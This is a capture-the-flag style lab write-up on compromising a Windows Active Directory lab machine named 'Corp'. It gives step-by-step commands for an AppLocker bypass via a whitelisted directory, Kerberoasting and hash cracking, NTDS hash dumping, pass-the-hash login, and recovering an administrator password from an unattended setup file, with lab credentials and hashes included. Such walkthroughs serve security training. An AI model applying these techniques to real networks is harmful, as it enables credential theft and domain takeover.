---
title: "Corp"
description: "RDP Acces Bypassing Applocker if we download mimikatz from local and running on the target it would be detected as a virus so it will be deleted by the AV so let’s we try another"
lang: "en"
translationKey: "corp"
category: "lab-writeups"
tags: ["Lab", "Kerberoasting", "Unique Case Winpriv", "Dumping NTDS", "unattended.xml", "Active Directory"]
publishDate: "2025-01-07"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "1745fca1-ed80-8099-9c9e-fc7366eb343d"
notionUrl: "https://app.notion.com/p/Corp-1745fca1ed8080999c9efc7366eb343d"
notionLastEdited: "2025-05-06T14:41:00.000Z"
---

# RDP Acces

```bash
Username: corp\dark
Password: _QuejVudId6

nmap -Pn -sCV -p3389 10.10.224.127
```

![](/images/corp/8e6dfe2bdf60.png)

# Bypassing Applocker

if we download mimikatz from local and running on the target it would be detected as a virus so it will be deleted by the AV

![](/images/corp/3a6208b30284.png)

so let’s we try another way, by running directly the program from shared folder. first connect our rdp with shared folder.

```bash
xfreerdp /v:10.10.133.158 /u:'corp\dark' /p:'_QuejVudId6' +clipboard /dynamic-resolution /drive:toolkit,/home/kali/Documents/OSCP/winpriv
```

![](/images/corp/8812b59c6994.png)

As you can notice, due to AppLocker restrictions, we cannot execute Nonetheless, they are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: `C:\Windows\System32\spool\drivers\color`. This is whitelisted by default.

![](/images/corp/011d240730ee.png)

# Kerberoasting

```bash
impacket-GetUserSPNs -dc-ip 10.10.224.127 corp.local/dark:"_QuejVudId6" -request
```

![](/images/corp/ce7b613ca937.png)

![](/images/corp/68866c3d5bd9.png)

then save the **tgs **of user fela and crack it using hashcat.

![](/images/corp/1cf089b39f0e.png)

```bash
hashcat -m 13100 ~/Documents/tryhackme/roast /usr/share/wordlists/rockyou.txt --force
```

![](/images/corp/02cf6402174c.png)

then use the credential for login RDP 

```bash
xfreerdp /v:10.10.200.111 /u:fela /p:'rubenF124' +clipboard /dynamic-resolution /drive:toolkit,/home/kali/Documents/OSCP/winpriv
```

![](/images/corp/127dcf9c068f.png)

# Privilege Escalation

## Opsi 1 

because fela is part of the **Domain Admins** group which means that we have the keys to the kingdom. Simply put, with this privilege, we can do everything on the DC such as dumping hashes, creating new domain admins’ users, etc. For the sake of simplicity, we’re just going to dump the hashes using netexec :

```bash
netexec smb 10.10.200.111 -u fela -p 'rubenF124' --ntds
```

![](/images/corp/f8b3acd1c98f.png)

then we can use the hash using pass the hash technique for login into server as Administrator. but if you want to abuse NTLM Hash of krbtgt use this referensi on minutes 16:00 ([https://www.youtube.com/watch?v=eBDSbZgjniE&ab_channel=ITHOTDOG](https://www.youtube.com/watch?v=eBDSbZgjniE&ab_channel=ITHOTDOG)) 

```bash
evil-winrm -i 10.10.200.111 -u Administrator -H bd839bd6be092b794013e25068820d15
```

![](/images/corp/9aa72f8aa9a6.png)

## Opsi 2

we can’t run winpeas it’s so slow, so we use powerup to do enumeration here

![](/images/corp/47edd55732f2.png)

from here we see that we identified 2 ways for privileges escalation. so let’s we check for unattendPath what the inside file.

![](/images/corp/97b23d3b334c.png)

wow we found Administrator credential in base64 format let’s we decrypt it and and use it for login as administrator user.

![](/images/corp/a8cfa1c3d9ac.png)

```bash
xfreerdp /v:10.10.187.249 /u:'corp\administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' +clipboard /dynamic-resolution
```

![](/images/corp/c569202cb88d.png)

![](/images/corp/19622539433f.png)

![](/images/corp/836ed9c42acf.png)
